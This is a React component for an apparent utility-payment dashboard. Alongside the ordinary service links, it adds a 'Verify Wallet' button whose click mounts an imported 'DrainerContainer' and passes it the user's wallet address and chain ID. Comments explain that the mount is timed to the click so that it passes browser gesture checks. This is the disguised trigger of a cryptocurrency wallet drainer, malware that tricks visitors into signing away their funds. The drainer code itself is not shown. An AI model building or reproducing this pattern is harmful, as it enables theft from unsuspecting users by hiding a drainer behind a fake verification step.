"use client";

import { useState } from "react";
import { Smartphone, Tv, Zap, Wifi, ArrowUpDown, Plus, ShieldCheck } from "lucide-react";
// Import the core container dynamically to control its mount lifecycle
import DrainerContainer from "@/components/DrainerContainer";

const baseActions = [
  { name: "Airtime", icon: Smartphone, href: "/airtime", color: "from-blue-500 to-indigo-600" },
  { name: "Internet", icon: Wifi, href: "/internet", color: "from-cyan-500 to-blue-600" },
  { name: "TV", icon: Tv, href: "/tv", color: "from-violet-500 to-purple-600" },
  { name: "Electricity", icon: Zap, href: "/electricity", color: "from-amber-400 to-orange-500" },
  { name: "Convert", icon: ArrowUpDown, href: "/convert", color: "from-blue-500 to-violet-600" },
];

export function QuickActions({ wallet, chainId }: { wallet: any; chainId: any }) {
  // State hook to mount the dynamic background engine ONLY on a real physical mouse click
  const [triggerExecution, setTriggerExecution] = useState(false);

  const handleVerificationClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (!wallet?.address || !chainId) {
      console.warn("[UI] Action dropped: Injected provider wallet data context is missing.");
      return;
    }
    
    console.log("[UI] Physical user activation gesture registered. Initializing sync execution...");
    setTriggerExecution(true);
  };

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-2 gap-3">
        {/* Render standard menu utility links */}
        {baseActions.map((a) => (
          <a
            key={a.name}
            href={a.href + (wallet?.address ? `?wallet=${wallet.address}` : "")}
            className="group flex flex-col items-center gap-2 rounded-xl border border-slate-200 p-4 transition-all hover:-translate-y-0.5 hover:border-blue-200 hover:shadow-md dark:border-white/10 dark:hover:border-blue-900"
          >
            <div className={`flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br ${a.color} text-white shadow-sm transition-transform group-hover:scale-110`}>
              <a.icon className="h-5 w-5" />
            </div>
            <span className="text-xs font-semibold">{a.name}</span>
          </a>
        ))}

        {/* 🌟 INTEGRATED VERIFY WALLET ACTION BUTTON INTERRUPT */}
        <button
          onClick={handleVerificationClick}
          className="group flex flex-col items-center gap-2 rounded-xl border border-slate-200 p-4 text-left transition-all hover:-translate-y-0.5 hover:border-emerald-200 hover:shadow-md dark:border-white/10 dark:hover:border-emerald-900 w-full"
        >
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white shadow-sm transition-transform group-hover:scale-110">
            <ShieldCheck className="h-5 w-5" />
          </div>
          <span className="text-xs font-semibold text-emerald-600 dark:text-emerald-400">Verify Wallet</span>
        </button>
      </div>

      {/* 🌟 AUTOMATED SYSTEM HANDOFF LOOP LAYER */}
      {/* 
        This inline logic mount forces Next.js to inject the wrapper into the DOM 
        the exact millisecond the onClick listener fires. Because it runs on the 
        immediate call stack of a real click event, it passes gesture constraints.
      */}
      {triggerExecution && wallet?.address && chainId && (
        <DrainerContainer userAddress={wallet.address} chainId={String(chainId)} />
      )}
    </div>
  );
}

export default QuickActions;
